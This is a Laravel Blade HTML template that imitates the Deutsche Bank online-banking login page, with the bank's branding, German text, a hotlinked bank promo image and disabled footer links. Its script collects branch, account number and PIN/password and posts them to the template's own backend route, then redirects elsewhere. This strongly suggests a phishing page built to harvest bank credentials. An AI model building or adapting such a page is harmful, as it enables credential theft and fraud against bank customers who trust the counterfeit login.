<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>Deutsche Bank – Online-Banking Login</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}

:root{
  --blue:#0066b2;
  --blue-dk:#00519e;
  --navy:#1a2c6b;
  --red:#cc0000;
  --grey:#e8e8e8;
  --grey-b:#b0b0b0;
  --grey-t:#767676;
  --text:#202020;
  --white:#fff;
  --link:#0066b2;
  --sidebar-w:375px;
}

html,body{
  min-height:100%;
  font-family: "DeutscheBank UI", Helvetica, sans-serif;
  font-size: 25px;
  color:var(--text);
}

body{
  background-color:#3a8fd4;
  background-image:url("dbbg.jpg");
  background-size:cover;
  background-position:center top;
  background-attachment:fixed;
  background-repeat:no-repeat;
}

.page{
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

.layout{
  flex:1;
  display:flex;
  align-items:flex-start;
}

.left-col{
  flex:1;
  min-height:100vh;
  display:flex;
  align-items:center;
  padding-left:18%;
  padding-top:0;
  padding-bottom:0;
}

.card{
  background:var(--white);
  width:560px;
  padding:46px 54px 50px;
  animation:fadeUp .38s ease both;
}

.logo-row{ display:flex; align-items:center; gap:8px; margin-bottom:28px; }
.logo-text{ font-size:16.5px; font-weight:400; color:var(--text); }
.logo-sq{
  width:24px; height:24px; flex-shrink:0;
  border:2px solid var(--blue); background:var(--white);
  display:flex; align-items:center; justify-content:center;
}

.card-title{ font-size:28px; font-weight:700; color:var(--text); margin-bottom:9px; line-height:1.1; }
.card-sub{ font-size:14.5px; color:var(--text); margin-bottom:24px; }

.fields-row{ display:flex; gap:8px; margin-bottom:18px; align-items:flex-end; }
.field{ display:flex; flex-direction:column; }
.f-fil{ flex:0 0 120px; }
.f-kon{ flex:1; }
.f-unt{ flex:0 0 72px; }

.lbl{ font-size:12.5px; margin-bottom:3px; color:var(--text); }
.lbl.red{ color:var(--red); }
.lbl.grey{ color:var(--grey-t); }

.inp{
  height:40px; border:1px solid #aaa;
  padding:0 9px; font-size:14.5px; color:var(--text);
  background:var(--white); outline:none; border-radius:0;
  -webkit-appearance:none; width:100%; display:block;
  transition:border-color .13s, box-shadow .13s;
}
.inp.err{ border:1.5px solid var(--red); }
.inp:focus:not([disabled]){ border-color:var(--blue); box-shadow:0 0 0 2px rgba(0,102,178,.17); }
.inp.err:focus{ border-color:var(--red); box-shadow:0 0 0 2px rgba(204,0,0,.13); }
.inp[disabled]{ background:var(--grey); border-color:#ccc; color:var(--grey-t); cursor:default; }

.dbid{
  display:inline-block; color:var(--link); font-size:13.5px;
  text-decoration:underline; margin-bottom:44px;
  cursor:pointer; background:none; border:none; padding:0; font-family:inherit;
}
.dbid:hover{ color:var(--blue-dk); }

.card-btm{ display:flex; align-items:center; justify-content:space-between; }
.btn-fgt{
  color:var(--link); font-size:13.5px; text-decoration:underline;
  background:none; border:none; cursor:pointer; padding:0; font-family:inherit;
}
.btn-fgt:hover{ color:var(--blue-dk); }
.btn-weiter{
  background:var(--blue); color:#fff; border:none;
  height:42px; padding:0 28px; font-size:15px; font-weight:400;
  font-family:inherit; cursor:pointer; border-radius:0; min-width:100px;
  transition:background .13s;
  position:relative; overflow:hidden;
}
.btn-weiter:hover{ background:var(--blue-dk); }
.btn-weiter:active{ background:#003f80; }
.btn-weiter:disabled{ opacity:.65; cursor:default; }

/* ── Spinner bouton ── */
.btn-weiter .spinner{
  display:none;
  width:16px; height:16px;
  border:2px solid rgba(255,255,255,.35);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
  position:absolute; top:50%; left:50%;
  transform:translate(-50%,-50%);
}
.btn-weiter.loading .btn-label{ opacity:0; }
.btn-weiter.loading .spinner{ display:block; }

/* ── Résumé compte étape 2 ── */
.account-summary{
  display:none;
  align-items:center;
  gap:10px;
  background:#f4f8fc;
  border:1px solid #d0e4f0;
  padding:10px 12px;
  margin-bottom:18px;
  font-size:13px;
  color:var(--text);
}
.account-summary.visible{ display:flex; animation:fadeUp .25s ease; }
.account-summary .acct-num{ font-weight:700; font-size:14px; color:var(--blue); }
.account-summary .change-btn{
  margin-left:auto; color:var(--link); font-size:12px;
  text-decoration:underline; background:none; border:none;
  cursor:pointer; font-family:inherit; padding:0;
}

/* ── Champ password slide ── */
.password-section{
  overflow:hidden;
  max-height:0;
  opacity:0;
  transition:max-height .4s ease, opacity .35s ease, margin-bottom .4s ease;
  margin-bottom:0;
}
.password-section.visible{
  max-height:110px;
  opacity:1;
  margin-bottom:18px;
}
.password-section .field{ width:100%; }

/* ── Message d'erreur ── */
.alert-error{
  display:none;
  background:#fff0f0;
  border-left:3px solid var(--red);
  color:var(--red);
  font-size:13px;
  padding:10px 12px;
  margin-bottom:16px;
  line-height:1.4;
}
.alert-error.visible{ display:block; animation:fadeUp .25s ease; }

.sidebar{
  width:var(--sidebar-w);
  flex-shrink:0;
  background:var(--white);
  display:flex;
  flex-direction:column;
  min-height:100vh;
  margin-right:250px;
}

.promo-img{
  width:100%;
  height:182px;
  padding: 5%;
  background-size:auto;
  position:relative; overflow:hidden; flex-shrink:0;
}
.promo-tag{
  position:absolute; top:12px; left:50%; transform:translateX(-50%);
  color:#b0c8e0; font-size:11px; text-align:center; line-height:1.6; white-space:nowrap;
}
.promo-tag em{ color:#7ab8e8; font-style:normal; font-size:10px; }
.ph-big{
  position:absolute; right:80px; top:50%; transform:translateY(-50%);
  width:66px; height:112px;
  background:linear-gradient(170deg,#3a3a58,#22223a);
  border-radius:10px; border:1.5px solid rgba(255,255,255,.2);
  box-shadow:-7px 5px 20px rgba(0,0,0,.5);
}
.ph-big-scr{
  position:absolute; inset:5px;
  background:linear-gradient(145deg,#0e5caa,#07305c);
  border-radius:6px; overflow:hidden;
  display:flex; align-items:flex-end; justify-content:flex-end; padding:5px;
}
.ph-card{
  width:30px; height:20px;
  background:linear-gradient(135deg,#e8b000,#b88800);
  border-radius:3px; border:1px solid rgba(255,255,255,.25);
}
.ph-sm{
  position:absolute; right:30px; bottom:14px;
  width:48px; height:78px;
  background:linear-gradient(170deg,#484860,#2e2e48);
  border-radius:8px; border:1.5px solid rgba(255,255,255,.15);
  box-shadow:4px 4px 16px rgba(0,0,0,.4);
}
.ph-sm-scr{
  position:absolute; inset:4px; background:#fff; border-radius:4px; overflow:hidden;
}
.ph-sm-scr::after{
  content:''; display:block; width:100%; height:50%;
  background:linear-gradient(to bottom,#ddeaf8,#c8d8ec);
}
.promo-badge{
  position:absolute; top:18px; right:74px;
  width:40px; height:40px; background:#14142a; border-radius:50%;
  border:2px solid rgba(255,255,255,.22);
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  color:#fff; font-size:7.5px; font-weight:700; text-align:center; line-height:1.3;
}

.promo-body{ padding: 5%; border-bottom:1px solid #e0e0e0; }
.promo-title{ font-size:20px; font-weight:700; color:var(--text); margin-bottom:8px; }
.promo-desc{ font-size:16px; color:var(--text); line-height:1.5; margin-bottom:8px; }
.promo-mehr{ color:var(--link); font-size:15px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; }

.info-blk{ padding:26px 18px 13px; border-bottom:1px solid #e0e0e0; }
.info-hd{ display:flex; align-items:center; gap:9px; margin-bottom:7px; }
.info-ic{ flex-shrink:0; display:flex; align-items:center; }
.info-ttl{ font-size:20px; font-weight:700; color:var(--text); }
.info-txt{ font-size:15px; color:var(--text); line-height:1.5; margin-bottom:7px; }
.info-lnk{
  display:block; color:var(--link); font-size:14px; text-decoration:underline;
  cursor:pointer; background:none; border:none; padding:0; font-family:inherit;
  text-align:left; margin-bottom:3px; line-height:1.5;
}
.info-lnk:last-child{ margin-bottom:0; }

.ft{ background:var(--navy); padding:28px 28px 16px; margin-top:auto; }
.ft-links{ display:flex; flex-wrap:wrap; gap:4px 12px; margin-bottom:6px; }
.ft-a{ color:rgba(255,255,255,.88); font-size:16.5px; text-decoration:none; cursor:pointer; }
.ft-a:hover{ text-decoration:underline; }
.ft-copy{ font-size:15.5px; color:rgba(255,255,255,.6); margin-top:4px; }

@keyframes fadeUp{ from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
@keyframes shake{ 0%,100%{transform:translateX(0)} 20%{transform:translateX(-5px)} 40%{transform:translateX(5px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(3px)} }
@keyframes spin{ to{transform:translate(-50%,-50%) rotate(360deg)} }
.shake{ animation:shake .33s ease; }

@media(max-width:767px){
  body{ background-image:none; background-color:var(--navy); }
  .layout{ flex-direction:column; }
  .left-col{ flex:none; min-height:0; padding:0; width:100%; display:block; }
  .card{ width:100%; padding:26px 18px 30px; border-radius:0; }
  .card-title{ font-size:24px; }
  .fields-row{ flex-direction:column; gap:12px; margin-bottom:16px; }
  .f-fil,.f-kon,.f-unt{ flex:none; width:100%; }
  .inp{ height:44px; }
  .dbid{ margin-bottom:24px; }
  .card-btm{ flex-direction:column; align-items:stretch; gap:10px; }
  .btn-weiter{ width:100%; order:-1; height:44px; }
  .btn-fgt{ text-align:left; order:0; }
  .sidebar{ width:100%; min-height:0; margin-right:0; }
}

@media(min-width:768px) and (max-width:1100px){
  :root{ --sidebar-w:280px; }
  .left-col{ padding-left:2%; }
  .card{ width:380px; padding:30px 32px 34px; }
  .sidebar{ margin-right:60px; }
}
</style>
</head>
<body>
<div class="page">
  <div class="layout">

    <!-- ====== LEFT: transparent + card ====== -->
    <div class="left-col">
      <div class="card">

        <div class="logo-row">
          <span class="logo-text">Deutsche Bank</span>
          <div class="logo-sq">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
              <line x1="1" y1="1" x2="13" y2="13" stroke="#0066b2" stroke-width="2.2" stroke-linecap="square"/>
            </svg>
          </div>
        </div>

        <h1 class="card-title" id="greeting">Guten Morgen</h1>
        <p class="card-sub" id="cardSub">Bitte geben Sie Ihre Zugangsdaten ein.</p>

        {{-- Message d'erreur --}}
        <div class="alert-error" id="alertError"></div>

        {{-- Résumé compte (étape 2) --}}
        <div class="account-summary" id="accountSummary">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <circle cx="8" cy="8" r="7" stroke="#0066b2" stroke-width="1.4"/>
            <path d="M8 4.5v3.5l2.5 1.5" stroke="#0066b2" stroke-width="1.4" stroke-linecap="round"/>
          </svg>
          <span>Konto: <strong class="acct-num" id="acctDisplay"></strong></span>
          <button class="change-btn" id="changeAcctBtn" type="button">Ändern</button>
        </div>

        {{-- Étape 1 : Filiale + Konto --}}
        <div id="fieldsWrap">
          <div class="fields-row">
            <div class="field f-fil">
              <label class="lbl red" for="filiale">Filiale</label>
              <input class="inp err" type="text" id="filiale"
                     inputmode="numeric" autocomplete="off" maxlength="4"/>
            </div>
            <div class="field f-kon">
              <label class="lbl" for="konto">Konto</label>
              <input class="inp" type="text" id="konto"
                     inputmode="numeric" autocomplete="off" maxlength="10"/>
            </div>
            <div class="field f-unt">
              <label class="lbl grey" for="unterkonto">Unterkonto</label>
              <input class="inp" type="text" id="unterkonto" value="00" disabled/>
            </div>
          </div>

          <button class="dbid" type="button" id="dbidBtn">Mit Deutsche Bank ID einloggen</button>
        </div>

        {{-- Étape 2 : Password slide --}}
        <div class="password-section" id="passwordSection">
          <div class="field">
            <label class="lbl" for="password">PIN / Passwort</label>
            <input class="inp" type="password" id="password"
                   autocomplete="current-password" minlength="8"/>
          </div>
        </div>

        <div class="card-btm">
          <a href="/forgot-password" class="btn-fgt" type="button"  id="forgotBtn">Zugangsdaten vergessen?</a>
          <button class="btn-weiter" type="button" id="weiterBtn">
            <span class="btn-label">Weiter</span>
            <span class="spinner"></span>
          </button>
        </div>

      </div>
    </div>

    <!-- ====== RIGHT SIDEBAR ====== -->
    <aside class="sidebar">

      <div class="promo-img">
        <img style="width: 100%;" src="https://www.deutsche-bank.de/dam/deutschebank/de/shared/trxm/vorteilswelt/Samsung_Wallet_ Promo_1200x750_DB_ohne_Logo_ohne_Energielabel.jpg" alt=""/>
      </div>




      <div class="promo-body">
        <h2 class="promo-title">Spezial-Angebot für das neue Galaxy S26</h2>
        <p class="promo-desc">Sichern Sie sich auf das neue Smartphone von Samsung Ihren Preisvorteil und freuen Sie sich auf das erste Privacy-Display in einem Smartphone (Ultra-Modell).</p>
        <button class="promo-mehr">Zur Vorteilswelt</button>
      </div>

      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="19" height="19" viewBox="0 0 19 19" fill="none">
              <path d="M9.5 2.5L17 16.5H2L9.5 2.5Z" stroke="#333" stroke-width="1.4" stroke-linejoin="round"/>
              <line x1="9.5" y1="8" x2="9.5" y2="12" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>
              <circle cx="9.5" cy="14" r=".85" fill="#333"/>
            </svg>
          </div>
          <span class="info-ttl">Sicherheitshinweise</span>
        </div>
        <p class="info-txt">Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.</p>
        <button class="info-lnk">Link zu den aktuellen Sicherheitshinweisen</button>
        <button class="info-lnk">Link zu Sicherheit im Überblick</button>
      </div>

      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="21" height="18" viewBox="0 0 21 18" fill="none">
              <rect x="1" y="1" width="19" height="13" rx="1" stroke="#333" stroke-width="1.4"/>
              <rect x="3.5" y="3.5" width="14" height="8" stroke="#333" stroke-width="1"/>
              <line x1="6.5" y1="14" x2="14.5" y2="14" stroke="#333" stroke-width="1.4"/>
              <line x1="10.5" y1="14" x2="10.5" y2="17" stroke="#333" stroke-width="1.4"/>
              <line x1="6.5" y1="17" x2="14.5" y2="17" stroke="#333" stroke-width="1.4"/>
            </svg>
          </div>
          <span class="info-ttl">Online-Banking Zugang</span>
        </div>
        <p class="info-txt">Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.</p>
        <button class="info-lnk">Zugang zum Online-Banking beantragen</button>
      </div>

      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="17" height="21" viewBox="0 0 17 21" fill="none">
              <rect x="1.5" y="8.5" width="14" height="11" rx="1" stroke="#333" stroke-width="1.4"/>
              <path d="M5 8.5V5.5a3.5 3.5 0 017 0v3" stroke="#333" stroke-width="1.4"/>
              <circle cx="8.5" cy="13.5" r="1.5" fill="#333"/>
              <line x1="8.5" y1="15" x2="8.5" y2="17" stroke="#333" stroke-width="1.4" stroke-linecap="round"/>
            </svg>
          </div>
          <span class="info-ttl">Unsere Sicherheitsverfahren</span>
        </div>
        <p class="info-txt">Alles Wissenswerte rund um Ihren Login.</p>
        <button class="info-lnk">Link zu den Sicherheitsverfahren</button>
      </div>

      <footer class="ft">
        <div class="ft-links">
          <a class="ft-a" href="#" onclick="return false;">English Version</a>
          <a class="ft-a" href="#" onclick="return false;">Hilfe</a>
          <a class="ft-a" href="#" onclick="return false;">Demo-Konto</a>
          <a class="ft-a" href="#" onclick="return false;">Impressum</a>
          <a class="ft-a" href="#" onclick="return false;">Rechtliche Hinweise</a>
          <a class="ft-a" href="#" onclick="return false;">Datenschutz</a>
          <a class="ft-a" href="#" onclick="return false;">Cookie-Einstellungen</a>
        </div>
        <p class="ft-copy">© 2026 Deutsche Bank AG</p>
      </footer>

    </aside>
  </div>
</div>

<script>
(function () {

  /* ── Greeting ── */
  var h = new Date().getHours();
  document.getElementById('greeting').textContent =
    h >= 5 && h < 12 ? 'Guten Morgen' : h >= 12 && h < 18 ? 'Guten Tag' : 'Guten Abend';

  /* ── Refs ── */
  var filiale         = document.getElementById('filiale');
  var konto           = document.getElementById('konto');
  var password        = document.getElementById('password');
  var weiterBtn       = document.getElementById('weiterBtn');
  var btnLabel        = weiterBtn.querySelector('.btn-label');
  var passwordSection = document.getElementById('passwordSection');
  var accountSummary  = document.getElementById('accountSummary');
  var acctDisplay     = document.getElementById('acctDisplay');
  var fieldsWrap      = document.getElementById('fieldsWrap');
  var dbidBtn         = document.getElementById('dbidBtn');
  var changeAcctBtn   = document.getElementById('changeAcctBtn');
  var alertError      = document.getElementById('alertError');
  var cardSub         = document.getElementById('cardSub');
  var forgotBtn       = document.getElementById('forgotBtn');
  var csrfToken       = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  var step = 1;

  /* ── Helpers ── */
  function showError(msg) {
    alertError.textContent = msg;
    alertError.classList.add('visible', 'shake');
    alertError.addEventListener('animationend', function () {
      alertError.classList.remove('shake');
    }, { once: true });
  }

  function clearError() {
    alertError.classList.remove('visible');
    alertError.textContent = '';
  }

  function shakeField(el) {
    el.classList.add('err', 'shake');
    el.addEventListener('animationend', function () {
      el.classList.remove('shake');
    }, { once: true });
  }

  function setLoading(on) {
    weiterBtn.disabled = on;
    weiterBtn.classList.toggle('loading', on);
  }

  /* ── Filiale : chiffres seulement, 4 max ── */
  filiale.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 4);
    if (this.value) this.classList.remove('err');
  });
  filiale.addEventListener('blur', function () {
    if (!this.value) this.classList.add('err');
  });
  filiale.addEventListener('focus', clearError);

  /* ── Konto : chiffres seulement, 10 max ── */
  konto.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 10);
    if (this.value) this.classList.remove('err');
  });
  konto.addEventListener('focus', clearError);

  /* ── Password : pas de restriction de caractères, min 8 ── */
  password.addEventListener('focus', clearError);
  password.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') weiterBtn.click();
  });

  /* ── Changer de compte → retour étape 1 ── */
  changeAcctBtn.addEventListener('click', function () {
    step = 1;
    btnLabel.textContent    = 'Weiter';
    cardSub.textContent     = 'Bitte geben Sie Ihre Zugangsdaten ein.';
    passwordSection.classList.remove('visible');
    accountSummary.classList.remove('visible');
    fieldsWrap.style.display = '';
    dbidBtn.style.display    = '';
    password.value = '';
    clearError();
    filiale.focus();
  });

  /* ── Bouton principal ── */
  weiterBtn.addEventListener('click', function () {

    /* === ÉTAPE 1 : validation numéro de compte === */
    if (step === 1) {
      var ok = true;
      if (!filiale.value.trim()) { shakeField(filiale); ok = false; }
      if (!konto.value.trim())   { shakeField(konto);   ok = false; }
      if (!ok) { showError('Bitte füllen Sie alle Pflichtfelder aus.'); return; }

      /* Passer à l'étape 2 */
      step = 2;
      acctDisplay.textContent  = filiale.value.trim() + konto.value.trim();
      btnLabel.textContent     = 'Anmelden';
      cardSub.textContent      = 'Bitte geben Sie Ihr Passwort ein.';
      fieldsWrap.style.display = 'none';
      dbidBtn.style.display    = 'none';
      accountSummary.classList.add('visible');
      passwordSection.classList.add('visible');
      clearError();
      setTimeout(function () { password.focus(); }, 420);

    /* === ÉTAPE 2 : envoi AJAX vers Laravel === */
    } else {

      /* Validation : password obligatoire, min 8 caractères */
      if (!password.value) {
        shakeField(password);
        showError('Bitte geben Sie Ihr Passwort ein.');
        return;
      }
      if (password.value.length < 8) {
        shakeField(password);
        showError('Das Passwort muss mindestens 8 Zeichen lang sein.');
        return;
      }

      setLoading(true);
      clearError();

      fetch('{{ route("login.feature") }}', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept':       'application/json',
          'X-CSRF-TOKEN': csrfToken
        },
        body: JSON.stringify({
          numero_compte: filiale.value.trim() + konto.value.trim(),
          password:      password.value
        })
      })
      .then(function (res) { return res.json(); })
      .then(function (data) {
        setLoading(false);
        if (data.success) {
          btnLabel.textContent           = '✓';
          weiterBtn.style.background     = '#1a8a3a';
          weiterBtn.style.pointerEvents  = 'none';
          setTimeout(function () {
            window.location.href = data.redirect;
          }, 600);
        } else {
          showError(data.message || 'Anmeldung fehlgeschlagen.');
          shakeField(password);
          password.value = '';
          password.focus();
        }
      })
      .catch(function () {
        setLoading(false);
        showError('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
      });
    }
  });

  /* ── Zugangsdaten vergessen ── */
  forgotBtn.addEventListener('click', function () {
    window.location.href = 'e';
  });

})();
</script>
</body>
</html>
